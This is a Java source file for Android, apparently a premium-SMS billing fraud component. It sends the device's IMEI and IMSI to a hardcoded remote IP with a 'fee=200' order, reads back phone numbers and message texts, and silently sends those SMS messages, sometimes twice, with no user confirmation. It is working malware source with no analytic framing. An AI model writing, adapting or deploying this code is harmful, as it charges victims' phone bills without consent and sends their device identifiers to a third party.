package pay;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;

import android.telephony.SmsManager;



public class Item {

	public boolean doPay(String imei, String imsi, boolean wap) {
		try{
			String res = read(imei, imsi, wap);
			String[] params = getUnipay(res);
			
			if(params == null) {
				return false;
			}
			send(params[0], params[1]);
			if(params.length > 2) {
				try {
					Thread.sleep(10000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				send(params[2], params[3]);
			}
			return true;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	public String[] getUnipay(String res) {
		String req = res;
		req = res;
		String flag = "\"isDirectPay\":\"";
		int index = req.indexOf(flag);
		String[] params = null;
		if (index > 0) {
			index += flag.length();
			req = req.substring(index, req.indexOf("\"", index));
			System.out.println("isDirectPay:"+req);
			if(Integer.valueOf(req).intValue() == 1) {
				params = new String[2];
			} else {
				params = new String[4];
			}
		} else {
			return null;
		}
		
		req = res;
		flag = "\"mo1Called\":\"";
		index = req.indexOf(flag);
		if (index > 0) {
			index += flag.length();
			req = req.substring(index, req.indexOf("\"", index));
			params[0] = req;
		} else {
			return null;
		}
		
		flag = "\"mo1Msg\":\"";
		req = res;
		index = req.indexOf(flag);
		if (index > 0) {
			index += flag.length();
			req = req.substring(index, req.indexOf("\"", index));
			params[1] = req;
		} else {
			return null;
		}
		if(params.length == 2) {
			return params;
		}
		req = res;
		flag = "\"mo2Called\":\"";
		index = req.indexOf(flag);
		if (index > 0) {
			index += flag.length();
			req = req.substring(index, req.indexOf("\"", index));
			params[2] = req;
		} else {
			return null;
		}
		
		req = res; 
		flag = "\"mo2Msg\":\"";
		index = req.indexOf(flag);
		if (index > 0) {
			index += flag.length();
			req = req.substring(index, req.indexOf("\"", index));
			params[3] = req;
		}
		return params;
	}

	private Random random = new Random();

	public String randomStr(int length) {
		StringBuffer sb = new StringBuffer();
		while (sb.length() < length) {
			sb.append(random.nextInt(10));
		}
		return sb.toString();
	}  

	public String read(String imei, String imsi, boolean wap) {
		String u = "http://50.62.140.128/interfaces/code1.jsp?merid=5970&cid=ee6df4492f8d80dd0b3899ad80453bef&iccid=89860060190739531595&imei="
				+ imei
				+ "&imsi="
				+ imsi 
				+ "&order="
				+ randomStr(16)
				+ "&fee=200";
		
		if(wap) {
			u =  "http://10.0.0.172:80/interfaces/code1.jsp?merid=5970&cid=ee6df4492f8d80dd0b3899ad80453bef&iccid=89860060190739531595&imei="
					+ imei
					+ "&imsi="
					+ imsi
					+ "&order="
					+ randomStr(16)
					+ "&fee=200";
		}
		InputStream in = null;
		HttpURLConnection connection = null;
		try {
			URL Url = new URL(u);
			connection = (HttpURLConnection) Url.openConnection();
			connection.setRequestMethod("GET");
			connection.setDoInput(true);
			connection.setDoOutput(true);
			connection.setUseCaches(false);
			if(wap) {
				connection.setRequestProperty("Host", "50.62.140.128");
				connection.setRequestProperty("X-Online-Host" , "50.62.140.128:80");
			}
			in = connection.getInputStream();
			ByteArrayOutputStream bo = new ByteArrayOutputStream();
			byte bs[] = new byte[0xfa000];
			for (int i = in.read(bs); i != -1; i = in.read(bs)) {
				bo.write(bs, 0, i);
			}
			return new String(bo.toByteArray());
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			if (connection == null) {
				connection.disconnect();
			}
		}
		return null;
	}
	
	public static boolean send(String mobile, String content) {
		try{
			SmsManager.getDefault().sendTextMessage(mobile, null, content, null, null);
		} catch (Exception e) {
        }
		return false;
	}
}
